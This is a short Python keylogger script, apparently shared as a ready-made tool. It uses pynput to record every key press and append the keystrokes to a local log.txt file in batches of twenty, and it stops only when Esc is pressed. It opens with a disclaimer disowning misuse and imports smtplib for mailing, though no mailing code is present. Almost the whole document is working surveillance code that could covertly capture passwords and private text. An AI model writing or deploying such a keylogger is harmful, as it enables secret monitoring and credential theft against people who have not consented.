#NOTE:I am not responsible for the damage inflicted by others using this script
#importing necessary modules
import pynput  
from pynput.keyboard import Key, Listener
import smtplib
count = 0
keystrokes=[]
#is invoked when a key is pressed
def on_press(key):
     global keystrokes,count
     keystrokes.append(key)
     count+=1
     #writes and updates to the file log.txt every 20 keystrokes
     if count>=20:
          count=0
          file_write(keystrokes)
          keystrokes=[]
#to write the keystrokes in a text file    
def file_write(keys):
     with open("log.txt",'a') as f:
          for k in keys:
               m=str(k).replace("'","")
               if(m.find("space")>0):
                    f.write("\n")
               elif m.find("Key")==-1:
                    f.write(m)
#is invoked when a key is released
def on_release(key):
     #if user presses esc key, the program stops 
     if(key==Key.esc):
          return False
#is invoked on runtime 
#calls Listener class which runs on on_press and on_release methods     
with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
